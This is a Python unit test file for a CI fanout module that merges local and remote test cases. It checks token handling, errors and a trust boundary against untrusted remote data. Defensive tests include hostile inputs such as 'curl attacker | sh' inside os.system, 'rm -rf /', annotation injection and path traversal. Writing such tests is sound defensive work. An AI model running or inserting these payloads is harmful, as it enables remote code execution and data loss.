import json
import os
import threading
import unittest
from io import BytesIO
from pathlib import Path
from tempfile import TemporaryDirectory
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from unittest import mock
from urllib.error import HTTPError, URLError

from saphirapy.facade import build_fanout_context, parse_fanout_kinds, report_fanout_warnings
from saphirapy.fanout import (
    FANOUT_PATH,
    API_KEY_ENV,
    FANOUT_USER_AGENT,
    FanoutRemoteError,
    RemoteActorUnavailable,
    api_endpoint,
    resolve_fanout,
)
from saphirapy.github_actions_contracts import (
    build_cast_production_outputs,
    build_remote_actor_resolver,
)
from saphirapy.detect_production_map import detect_production_mapping

ENDPOINT = "https://fanout.example.test/v1/saphira/fanout"
TOKEN = "wrk_live_abcdefgh_" + "s" * 43
CHEM_LAB = Path(__file__).resolve().parents[1] / "data" / "motion_planning" / "chem_lab_demo.py"


class FakeResponse:
    def __init__(self, payload, status=200):
        self.payload = payload
        self.status = status

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return False

    def read(self):
        return json.dumps(self.payload).encode("utf-8")


class RecordingOpener:
    """An opener that records each request and answers with a fixed payload."""

    def __init__(self, payload=None, status=200):
        self.payload = {"cases": []} if payload is None else payload
        self.status = status
        self.requests = []

    def __call__(self, request, timeout):
        self.requests.append(request)
        return FakeResponse(self.payload, self.status)


def http_error(status, detail):
    body = BytesIO(json.dumps({"detail": detail}).encode("utf-8"))
    return HTTPError(ENDPOINT, status, "error", {}, body)


def remote_actor_case(actor="bidirectional_rrt", cast_call_index=0, **overrides):
    return {
        "case-id": f"wrench-{actor}",
        "production-class": "ChemLab1",
        "actor-variant-json": json.dumps({"cast_call_index": cast_call_index, "actor": actor}),
        "source": "wrench",
        **overrides,
    }


class FanoutTest(unittest.TestCase):
    local_cases = [
        {
            "production-class": "ChemLab1",
            "actor-variant-json": "",
            "cast-production-name": "production-ChemLab1",
            "artifact-name": "matrix-result-ChemLab1",
        }
    ]

    def setUp(self):
        # Tests choose their token explicitly; never pick one up from the developer's shell.
        patcher = mock.patch.dict(os.environ)
        patcher.start()
        os.environ.pop(API_KEY_ENV, None)
        self.addCleanup(patcher.stop)

    def resolve(self, opener, source="remote", **kwargs):
        kwargs.setdefault("token", TOKEN)
        return resolve_fanout(
            self.local_cases, source=source, endpoint=ENDPOINT, opener=opener, **kwargs
        )

    def test_local_is_default_and_does_not_call_remote(self):
        def opener(*_args, **_kwargs):
            raise AssertionError("remote opener should not be called")

        resolution = resolve_fanout(self.local_cases, opener=opener)

        self.assertEqual(resolution.source, "local")
        self.assertEqual(resolution.remote_status, "disabled")
        self.assertEqual(resolution.cases[0]["case-id"], "production-ChemLab1")

    def test_remote_cases_are_added_and_duplicates_are_removed(self):
        opener = RecordingOpener(
            {
                "cases": [
                    {"case-id": "production-ChemLab1", "production-class": "ChemLab1"},
                    {"case-id": "premium-ChemLab1", "production-class": "ChemLab1"},
                ]
            }
        )

        resolution = self.resolve(opener)

        self.assertEqual(resolution.source, "local-plus-remote")
        self.assertEqual([case["case-id"] for case in resolution.cases], [
            "production-ChemLab1", "premium-ChemLab1"
        ])
        self.assertEqual(resolution.cases[1]["source"], "remote")
        self.assertEqual(resolution.remote_case_count, 1)

    def test_remote_cases_are_counted_whatever_the_service_labels_them(self):
        opener = RecordingOpener(
            {
                "cases": [
                    {"case-id": "wrench-a", "production-class": "ChemLab1", "source": "wrench"},
                    {"case-id": "wrench-b", "production-class": "ChemLab1", "source": "local"},
                ]
            }
        )

        self.assertEqual(self.resolve(opener).remote_case_count, 2)

    def test_local_and_fallback_runs_count_no_remote_cases(self):
        self.assertEqual(resolve_fanout(self.local_cases).remote_case_count, 0)
        fallback = self.resolve(RecordingOpener(), "remote-with-fallback", token="")
        self.assertEqual(fallback.remote_case_count, 0)

    def test_request_id_from_the_service_is_kept(self):
        request_id = "0b6f3c2e-7f1a-4c55-9d0e-5a4b3c2d1e0f"
        opener = RecordingOpener({"cases": [], "request_id": request_id})

        self.assertEqual(self.resolve(opener).request_id, request_id)

    def test_malformed_request_id_is_ignored(self):
        for request_id in [None, 42, "", "not a uuid; rm -rf /", "x" * 65]:
            with self.subTest(request_id=request_id):
                opener = RecordingOpener({"cases": [], "request_id": request_id})

                self.assertIsNone(self.resolve(opener).request_id)

    def test_local_and_fallback_runs_have_no_request_id(self):
        self.assertIsNone(resolve_fanout(self.local_cases).request_id)
        self.assertIsNone(self.resolve(RecordingOpener(), "remote-with-fallback", token="").request_id)

    def test_endpoints_are_derived_from_the_api_url(self):
        for api_url in ["https://api-staging.wrenchrobotics.com", "https://api-staging.wrenchrobotics.com/"]:
            with self.subTest(api_url=api_url):
                self.assertEqual(
                    api_endpoint(api_url, FANOUT_PATH),
                    "https://api-staging.wrenchrobotics.com/v1/saphira/fanout",
                )

    # --- Request shape ---------------------------------------------------------------------

    def test_request_is_a_post_carrying_the_context(self):
        opener = RecordingOpener()
        context = {
            "repository": "owner/repo",
            "detected_production": "ChemLab1",
            "fanout_kinds": ["productions", "casts"],
        }

        self.resolve(opener, context=context)

        (request,) = opener.requests
        self.assertEqual(request.get_method(), "POST")
        self.assertEqual(request.get_header("Content-type"), "application/json")
        self.assertEqual(request.get_header("Authorization"), f"Bearer {TOKEN}")
        self.assertEqual(request.get_header("User-agent"), FANOUT_USER_AGENT)
        self.assertEqual(json.loads(request.data), {"schema_version": 1, **context})

    def test_request_without_context_still_sends_the_schema_version(self):
        opener = RecordingOpener()

        self.resolve(opener)

        self.assertEqual(json.loads(opener.requests[0].data), {"schema_version": 1})

    # --- Token handling --------------------------------------------------------------------

    def test_token_is_read_from_the_environment(self):
        opener = RecordingOpener()
        os.environ[API_KEY_ENV] = TOKEN

        self.resolve(opener, token=None)

        self.assertEqual(opener.requests[0].get_header("Authorization"), f"Bearer {TOKEN}")

    def test_explicit_token_wins_over_the_environment(self):
        opener = RecordingOpener()
        os.environ[API_KEY_ENV] = "from-environment"

        self.resolve(opener, token=TOKEN)

        self.assertEqual(opener.requests[0].get_header("Authorization"), f"Bearer {TOKEN}")

    def test_missing_token_falls_back_without_a_request(self):
        opener = RecordingOpener()

        for token in (None, "", "  "):
            resolution = self.resolve(opener, source="remote-with-fallback", token=token)
            self.assertEqual(resolution.source, "local-fallback")
            self.assertEqual(resolution.remote_status, "no fanout token provided")
            self.assertEqual(len(resolution.cases), 1)

        self.assertEqual(opener.requests, [])

    def test_missing_token_raises_under_remote_before_any_request(self):
        opener = RecordingOpener()

        with self.assertRaisesRegex(ValueError, API_KEY_ENV):
            self.resolve(opener, source="remote", token=None)

        self.assertEqual(opener.requests, [])

    # --- Error handling --------------------------------------------------------------------

    def test_unreachable_remote_uses_fallback_when_enabled(self):
        def opener(*_args, **_kwargs):
            raise URLError("connection refused")

        resolution = self.resolve(opener, source="remote-with-fallback")

        self.assertEqual(resolution.source, "local-fallback")
        self.assertIn("unreachable", resolution.remote_status)
        self.assertEqual(len(resolution.cases), 1)

    def test_unreachable_remote_fails_without_fallback(self):
        def opener(*_args, **_kwargs):
            raise URLError("connection refused")

        with self.assertRaises(FanoutRemoteError):
            self.resolve(opener)

    def test_malformed_remote_response_does_not_use_fallback(self):
        with self.assertRaises(FanoutRemoteError) as context:
            self.resolve(RecordingOpener({"unexpected": []}), source="remote-with-fallback")

        self.assertFalse(context.exception.retryable)

    def test_unauthorized_remote_response_does_not_use_fallback(self):
        with self.assertRaises(FanoutRemoteError) as context:
            self.resolve(RecordingOpener({"cases": []}, status=401), source="remote-with-fallback")

        self.assertFalse(context.exception.retryable)

    def test_disallowed_kind_is_a_hard_failure_naming_the_missing_scope(self):
        detail = "API key lacks the scope 'saphira:fanout:casts' (for fanout kind 'casts')"

        def opener(*_args, **_kwargs):
            raise http_error(403, detail)

        for source in ("remote", "remote-with-fallback"):
            with self.assertRaises(FanoutRemoteError) as context:
                self.resolve(opener, source=source, context={"fanout_kinds": ["casts"]})
            self.assertFalse(context.exception.retryable)
            self.assertIn("HTTP 403", str(context.exception))
            self.assertIn("saphira:fanout:casts", str(context.exception))

    def test_server_errors_remain_retryable(self):
        def opener(*_args, **_kwargs):
            raise http_error(503, "database unavailable")

        resolution = self.resolve(opener, source="remote-with-fallback")

        self.assertEqual(resolution.source, "local-fallback")
        self.assertIn("HTTP 503", resolution.remote_status)

    def test_error_details_are_flattened_and_bounded(self):
        def opener(*_args, **_kwargs):
            raise http_error(422, "line one\n::error::injected\n" + "x" * 1000)

        with self.assertRaises(FanoutRemoteError) as context:
            self.resolve(opener)

        message = str(context.exception)
        self.assertNotIn("\n", message)
        self.assertLess(len(message), 400)

    # --- Remote case trust boundary --------------------------------------------------------

    def test_remote_cases_carrying_code_are_rejected_under_every_source(self):
        code_cases = [
            remote_actor_case(**{
                "actor-variant-json": json.dumps({
                    "cast_call_index": 0,
                    "name": "evil",
                    "import_statements": ["import os"],
                    "instantiation_code": "os.system('curl attacker | sh')",
                    "variable_name": "x",
                    "method_to_call": "plan",
                })
            }),
            remote_actor_case(**{"actor-variant-json": {"cast_call_index": 0, "actor": "a",
                                                         "instantiation_code": "x = 1"}}),
            {"case-id": "c", "production-class": "ChemLab1", "import_statements": ["import os"]},
            {
                "case-id": "c",
                "production-class": "ChemLab1",
                "comparison-metadata-json": json.dumps({"nested": {"instantiation_code": "x"}}),
            },
        ]
        resolver = mock.Mock(side_effect=AssertionError("must not resolve"))

        for case in code_cases:
            for source in ("remote", "remote-with-fallback"):
                with self.subTest(case=case, source=source):
                    with self.assertRaises(FanoutRemoteError) as context:
                        # A valid case first: nothing from the response may be used.
                        self.resolve(
                            RecordingOpener({"cases": [remote_actor_case(), case]}),
                            source=source,
                            actor_resolver=resolver,
                        )
                    self.assertFalse(context.exception.retryable)
                    self.assertIn("executable fields", str(context.exception))
        resolver.assert_not_called()

    def test_malformed_remote_cases_are_rejected(self):
        malformed = [
            remote_actor_case(**{"actor-variant-json": json.dumps({"actor": "bidirectional_rrt"})}),
            remote_actor_case(**{"actor-variant-json": json.dumps(
                {"cast_call_index": 0, "actor": "bidirectional_rrt", "extra": 1})}),
            remote_actor_case(**{"actor-variant-json": json.dumps(
                {"cast_call_index": "0", "actor": "bidirectional_rrt"})}),
            remote_actor_case(**{"actor-variant-json": json.dumps(
                {"cast_call_index": -1, "actor": "bidirectional_rrt"})}),
            remote_actor_case(actor="rrt(); import os"),
            remote_actor_case(**{"actor-variant-json": "not json"}),
            remote_actor_case(**{"case-id": "../../escape"}),
            remote_actor_case(**{"artifact-name": "a/b"}),
            remote_actor_case(**{"production-class": "os.system('x')"}),
            "not an object",
        ]

        for case in malformed:
            with self.subTest(case=case):
                with self.assertRaises(FanoutRemoteError) as context:
                    self.resolve(RecordingOpener({"cases": [case]}), source="remote-with-fallback")
                self.assertFalse(context.exception.retryable)

    def test_actor_references_are_expanded_by_the_resolver(self):
        expanded = {"cast_call_index": 0, "name": "bidirectional_rrt", "instantiation_code": "x"}
        resolver = mock.Mock(return_value=expanded)

        resolution = self.resolve(
            RecordingOpener({"cases": [remote_actor_case()]}), actor_resolver=resolver
        )

        resolver.assert_called_once_with(0, "bidirectional_rrt")
        remote = resolution.cases[-1]
        self.assertEqual(json.loads(remote["actor-variant-json"]), expanded)
        self.assertEqual(remote["source"], "wrench")
        self.assertEqual(resolution.warnings, [])

    def test_unresolvable_actor_is_skipped_with_a_warning(self):
        def resolver(_index, name):
            raise RemoteActorUnavailable(f"actor {name!r} is not in the registry")

        resolution = self.resolve(
            RecordingOpener({"cases": [remote_actor_case("future_planner"),
                                       {"case-id": "wrench-p", "production-class": "ChemLab2"}]}),
            actor_resolver=resolver,
        )

        self.assertEqual(resolution.source, "local-plus-remote")
        self.assertEqual(
            [case["case-id"] for case in resolution.cases], ["production-ChemLab1", "wrench-p"]
        )
        self.assertEqual(len(resolution.warnings), 1)
        self.assertIn("wrench-future_planner", resolution.warnings[0])
        self.assertIn("future_planner", resolution.warnings[0])

    def test_actor_references_without_a_resolver_are_skipped(self):
        resolution = self.resolve(RecordingOpener({"cases": [remote_actor_case()]}))

        self.assertEqual(len(resolution.cases), 1)
        self.assertIn("no local actor registry", resolution.warnings[0])

    def test_local_cases_keep_their_code_carrying_shape(self):
        local_actor_case = {
            "case-id": "actor-bidirectional_rrt-0",
            "production-class": "ChemLab1",
            "actor-variant-json": json.dumps({"cast_call_index": 0, "instantiation_code": "x"}),
        }

        resolution = resolve_fanout(
            [local_actor_case],
            source="remote",
            endpoint=ENDPOINT,
            token=TOKEN,
            opener=RecordingOpener(),
        )

        self.assertEqual(resolution.cases[0]["actor-variant-json"],
                         local_actor_case["actor-variant-json"])


class RemoteActorResolverTest(unittest.TestCase):
    """The resolver expands references from the local registry, matching local cases exactly."""

    def setUp(self):
        self.resolver = build_remote_actor_resolver(CHEM_LAB)

    def test_reference_expands_to_the_equivalent_local_case(self):
        outputs = build_cast_production_outputs(
            json.dumps(detect_production_mapping(CHEM_LAB)), CHEM_LAB, False, True
        )
        local_variants = {
            json.loads(case["actor-variant-json"])["name"]: json.loads(case["actor-variant-json"])
            for case in json.loads(outputs["cast-productions-json"])
            if case["actor-variant-json"]
        }
        self.assertIn("bidirectional_rrt", local_variants)

        for name, local_variant in local_variants.items():
            with self.subTest(actor=name):
                self.assertEqual(
                    self.resolver(local_variant["cast_call_index"], name), local_variant
                )

    def test_unknown_actor_names_point_at_a_newer_release(self):
        with self.assertRaisesRegex(RemoteActorUnavailable, "newer saphira release"):
            self.resolver(0, "planner_from_the_future")

    def test_registered_actor_that_does_not_fit_the_cast_call_is_unavailable(self):
        # rrt_connect is registered, but it is the production's current actor, and there is
        # only one cast call.
        with self.assertRaisesRegex(RemoteActorUnavailable, "not an alternative"):
            self.resolver(0, "rrt_connect")
        with self.assertRaisesRegex(RemoteActorUnavailable, "cast call 5"):
            self.resolver(5, "bidirectional_rrt")


class FacadeContextTest(unittest.TestCase):
    local_cases = [
        {"case-id": "production-ChemLab1", "production-class": "ChemLab1",
         "actor-variant-json": json.dumps({"instantiation_code": "x"})},
    ]

    def test_context_carries_detection_github_metadata_and_case_identity(self):
        environ = {
            "GITHUB_REPOSITORY": "owner/repo",
            "GITHUB_SHA": "abc123",
            "GITHUB_RUN_ID": "42",
            "GITHUB_RUN_ATTEMPT": "1",
            API_KEY_ENV: TOKEN,
        }
        detection = {"detected_parent_class": "ChemLabParent", "detected_production_class": "ChemLab1"}

        context = build_fanout_context(detection, self.local_cases, ["casts"], environ)

        self.assertEqual(context, {
            "repository": "owner/repo",
            "sha": "abc123",
            "run_id": "42",
            "run_attempt": "1",
            "detected_parent": "ChemLabParent",
            "detected_production": "ChemLab1",
            "fanout_kinds": ["casts"],
            "local_cases": [{"case-id": "production-ChemLab1", "production-class": "ChemLab1"}],
        })
        self.assertNotIn(TOKEN, json.dumps(context))

    def test_context_omits_unknown_values(self):
        context = build_fanout_context(
            {"detected_parent_class": None, "detected_production_class": "UNMAPPED"}, [], None, {}
        )

        self.assertEqual(context, {"local_cases": []})

    def test_context_bounds_local_cases(self):
        cases = [{"case-id": f"c{i}", "production-class": "P"} for i in range(600)]

        self.assertEqual(len(build_fanout_context({}, cases, None, {})["local_cases"]), 500)

    def test_fanout_kinds_parsing(self):
        self.assertIsNone(parse_fanout_kinds(""))
        self.assertIsNone(parse_fanout_kinds(None))
        self.assertIsNone(parse_fanout_kinds(" , "))
        self.assertEqual(parse_fanout_kinds("productions, casts,productions"),
                         ["productions", "casts"])

    def test_warnings_reach_annotations_and_the_job_summary(self):
        with TemporaryDirectory() as directory:
            summary = Path(directory) / "summary.md"
            with mock.patch("builtins.print") as printed:
                report_fanout_warnings(["Skipped remote case wrench-x: unknown"], str(summary))

            printed.assert_called_once()
            self.assertIn("::warning", printed.call_args.args[0])
            self.assertIn("- Skipped remote case wrench-x: unknown", summary.read_text())


class FanoutMockServerTest(unittest.TestCase):
    local_cases = [{"production-class": "ChemLab1", "case-id": "local-ChemLab1"}]

    def run_server(self, status, payload):
        received = []

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                length = int(self.headers.get("Content-Length") or 0)
                received.append({
                    "headers": dict(self.headers),
                    "body": json.loads(self.rfile.read(length)),
                })
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(payload).encode("utf-8"))

            def log_message(self, *_args):
                return

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()

        def cleanup():
            server.shutdown()
            thread.join(timeout=2)
            server.server_close()

        self.addCleanup(cleanup)
        return f"http://127.0.0.1:{server.server_port}/fanout", received

    def test_real_http_server_adds_remote_case(self):
        endpoint, received = self.run_server(
            200,
            {"cases": [{"case-id": "premium-ChemLab1", "production-class": "ChemLab1"}]},
        )

        resolution = resolve_fanout(
            self.local_cases,
            source="remote",
            endpoint=endpoint,
            token=TOKEN,
            context={"detected_production": "ChemLab1"},
        )

        self.assertEqual(resolution.source, "local-plus-remote")
        self.assertEqual(resolution.cases[-1]["source"], "remote")
        self.assertEqual(received[0]["body"], {"schema_version": 1, "detected_production": "ChemLab1"})
        self.assertEqual(received[0]["headers"]["Authorization"], f"Bearer {TOKEN}")
        self.assertEqual(received[0]["headers"]["User-Agent"], FANOUT_USER_AGENT)

    def test_real_http_server_service_error_uses_fallback(self):
        endpoint, _received = self.run_server(503, {"error": "temporarily unavailable"})

        resolution = resolve_fanout(
            self.local_cases,
            source="remote-with-fallback",
            endpoint=endpoint,
            token=TOKEN,
        )

        self.assertEqual(resolution.source, "local-fallback")
        self.assertIn("HTTP 503", resolution.remote_status)

    def test_real_http_server_forbidden_kind_names_the_scope(self):
        endpoint, _received = self.run_server(
            403, {"detail": "API key lacks the scope 'saphira:fanout:casts'"}
        )

        with self.assertRaisesRegex(FanoutRemoteError, "saphira:fanout:casts"):
            resolve_fanout(
                self.local_cases, source="remote-with-fallback", endpoint=endpoint, token=TOKEN
            )


if __name__ == "__main__":
    unittest.main()
